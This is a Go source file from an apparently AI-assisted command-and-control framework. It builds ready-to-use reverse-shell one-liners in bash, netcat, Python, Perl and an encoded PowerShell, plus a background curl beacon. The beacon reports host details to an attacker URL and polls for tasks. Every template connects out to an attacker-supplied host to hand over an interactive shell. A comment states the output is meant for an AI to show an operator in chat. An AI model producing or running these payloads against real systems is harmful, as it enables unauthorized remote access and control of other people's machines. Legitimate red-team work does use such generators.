package c2

import (
	"encoding/json"
	"fmt"
	"net/url"
	"strings"

	"cyberstrike-ai/internal/database"
)

// OnelinerKind 单行 payload 的语言/形式
type OnelinerKind string

const (
	OnelinerBash       OnelinerKind = "bash"        // bash 反弹（TCP reverse listener）
	OnelinerNc         OnelinerKind = "nc"          // netcat 反弹
	OnelinerNcMkfifo   OnelinerKind = "nc_mkfifo"   // 通过 mkfifo 双向（部分 nc 不支持 -e）
	OnelinerPython     OnelinerKind = "python"      // python socket 反弹
	OnelinerPerl       OnelinerKind = "perl"        // perl 反弹
	OnelinerPowerShell OnelinerKind = "powershell"  // PowerShell TCP 反弹（IEX 风格）
	OnelinerCurl       OnelinerKind = "curl_beacon" // 用 curl 周期性轮询 HTTP beacon（无需二进制）
)

// AllOnelinerKinds 所有支持的 oneliner 类型
func AllOnelinerKinds() []OnelinerKind {
	return []OnelinerKind{
		OnelinerBash, OnelinerNc, OnelinerNcMkfifo,
		OnelinerPython, OnelinerPerl,
		OnelinerPowerShell, OnelinerCurl,
	}
}

// tcpOnelinerKinds 仅支持 tcp_reverse 监听器的裸 TCP 反弹类型
var tcpOnelinerKinds = map[OnelinerKind]bool{
	OnelinerBash:       true,
	OnelinerNc:         true,
	OnelinerNcMkfifo:   true,
	OnelinerPython:     true,
	OnelinerPerl:       true,
	OnelinerPowerShell: true,
}

// httpOnelinerKinds 支持 http_beacon / https_beacon 监听器的类型
var httpOnelinerKinds = map[OnelinerKind]bool{
	OnelinerCurl: true,
}

// OnelinerKindsForListener 根据监听器类型返回兼容的 oneliner 类型列表
func OnelinerKindsForListener(listenerType string) []OnelinerKind {
	switch ListenerType(listenerType) {
	case ListenerTypeTCPReverse:
		return []OnelinerKind{
			OnelinerBash, OnelinerNc, OnelinerNcMkfifo,
			OnelinerPython, OnelinerPerl, OnelinerPowerShell,
		}
	case ListenerTypeHTTPBeacon, ListenerTypeHTTPSBeacon, ListenerTypeWebSocket:
		return []OnelinerKind{OnelinerCurl}
	default:
		return nil
	}
}

// IsOnelinerCompatible 检查 oneliner 类型是否与监听器类型兼容
func IsOnelinerCompatible(listenerType string, kind OnelinerKind) bool {
	switch ListenerType(listenerType) {
	case ListenerTypeTCPReverse:
		return tcpOnelinerKinds[kind]
	case ListenerTypeHTTPBeacon, ListenerTypeHTTPSBeacon, ListenerTypeWebSocket:
		return httpOnelinerKinds[kind]
	default:
		return false
	}
}

// OnelinerInput 生成 oneliner 的入参
type OnelinerInput struct {
	Kind         OnelinerKind
	Host         string // 攻击机回连地址（IP/域名）
	Port         int    // 监听端口
	HTTPBaseURL  string // HTTPS Beacon 时使用，如 https://x.com
	ImplantToken string // HTTP Beacon 鉴权 token
}

// ValidateOnelinerForListener 校验 oneliner 与监听器配置是否匹配（如 tcp_reverse 默认要求加密 Beacon）。
func ValidateOnelinerForListener(listener *database.C2Listener, kind OnelinerKind) error {
	if listener == nil {
		return fmt.Errorf("listener is nil")
	}
	if ListenerType(listener.Type) == ListenerTypeTCPReverse && tcpOnelinerKinds[kind] {
		cfg := &ListenerConfig{}
		if strings.TrimSpace(listener.ConfigJSON) != "" {
			_ = json.Unmarshal([]byte(listener.ConfigJSON), cfg)
		}
		if !cfg.AllowLegacyShell {
			return fmt.Errorf("listener has not enabled allow_legacy_shell: tcp_reverse by default only accepts CSB1 encrypted beacons (AES-GCM + Token); use build to generate a beacon, or explicitly enable allow_legacy_shell (not recommended on public networks)")
		}
	}
	return nil
}

// GenerateOneliner 生成单行 payload。
// 设计要点：
//   - 不依赖目标机预装的可执行（除该 oneliner 关键的 bash/python/perl 等）；
//   - 不引入引号嵌套陷阱：使用 base64/url 编码避免 shell 转义错误；
//   - 同时返回执行示例，便于 AI 在对话里直接展示给操作员。
func GenerateOneliner(in OnelinerInput) (string, error) {
	host := strings.TrimSpace(in.Host)
	if err := ValidateBeaconDialHost(host); err != nil {
		return "", err
	}
	switch in.Kind {
	case OnelinerBash:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		// 用 bash -c 包裹，确保在 zsh/sh 等非 bash shell 中也能正确执行
		// /dev/tcp 是 bash 特有的伪设备，必须由 bash 进程解释
		return fmt.Sprintf(`bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'`, host, in.Port), nil

	case OnelinerNc:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		return fmt.Sprintf(`nc -e /bin/sh %s %d`, host, in.Port), nil

	case OnelinerNcMkfifo:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		// 双向 mkfifo 写法，对没有 -e 的 nc/openbsd-nc 也能用
		return fmt.Sprintf(
			`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f`,
			host, in.Port,
		), nil

	case OnelinerPython:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		// python -c 单引号包裹，内部用三引号或转义会引发兼容性问题，改用 base64 解码再 exec
		py := fmt.Sprintf(
			`import socket,os,pty;s=socket.socket();s.connect(("%s",%d));[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn("/bin/sh")`,
			host, in.Port,
		)
		// 用 b64 包装规避目标 shell 引号问题
		return fmt.Sprintf(
			`python3 -c "import base64,sys;exec(base64.b64decode('%s').decode())"`,
			b64StdEncode(py),
		), nil

	case OnelinerPerl:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		return fmt.Sprintf(
			`perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
			host, in.Port,
		), nil

	case OnelinerPowerShell:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		// PowerShell TCP 反弹（不依赖 .NET old 版本）
		ps := fmt.Sprintf(
			`$c=New-Object System.Net.Sockets.TcpClient('%s',%d);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$by=([text.encoding]::ASCII).GetBytes($o2);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()`,
			host, in.Port,
		)
		return fmt.Sprintf(
			`powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand %s`,
			utf16LEBase64(ps),
		), nil

	case OnelinerCurl:
		if strings.TrimSpace(in.HTTPBaseURL) == "" {
			return "", fmt.Errorf("http_base_url is required for curl_beacon")
		}
		if strings.TrimSpace(in.ImplantToken) == "" {
			return "", fmt.Errorf("implant_token is required for curl_beacon")
		}
		base := strings.TrimRight(in.HTTPBaseURL, "/")
		return fmt.Sprintf(
			`bash -c 'H="X-Implant-Token: %s";`+
				`URL="%s";`+
				`HN=$(hostname 2>/dev/null||echo unknown);`+
				`UN=$(whoami 2>/dev/null||echo unknown);`+
				`OS=$(uname -s 2>/dev/null||echo unknown);`+
				`AR=$(uname -m 2>/dev/null||echo unknown);`+
				`IP=$(hostname -I 2>/dev/null|awk "{print \$1}"||echo "");`+
				`ST=$(od -An -N32 -tx1 /dev/urandom|tr -d " \n");[ ${#ST} -eq 64 ]||exit 1;SH="X-Session-Token: $ST";SID="";`+
				`while :;do `+
				`BODY="{\"hostname\":\"$HN\",\"username\":\"$UN\",\"os\":\"$OS\",\"arch\":\"$AR\",\"internal_ip\":\"$IP\",\"pid\":$$}";`+
				`R=$(curl -fsSk -H "$H" -H "$SH" -H "Content-Type: application/json" -X POST "$URL/check_in" -d "$BODY" 2>/dev/null);`+
				`if [ -n "$R" ]&&[ -z "$SID" ];then SID=$(echo "$R"|grep -o "\"session_id\":\"[^\"]*\""|head -1|cut -d"\"" -f4);fi;`+
				`if [ -n "$SID" ];then `+
				`T=$(curl -fsSk -H "$H" -H "$SH" -G "$URL/tasks?session_id=$SID" 2>/dev/null);`+
				`fi;`+
				`sleep 5;`+
				`done' &`,
			in.ImplantToken, base,
		), nil
	}
	return "", fmt.Errorf("unsupported oneliner kind: %s", in.Kind)
}

// urlEncodeForShell URL 编码字符串，避免特殊字符在 shell 中破坏转义
func urlEncodeForShell(s string) string {
	return url.QueryEscape(s)
}
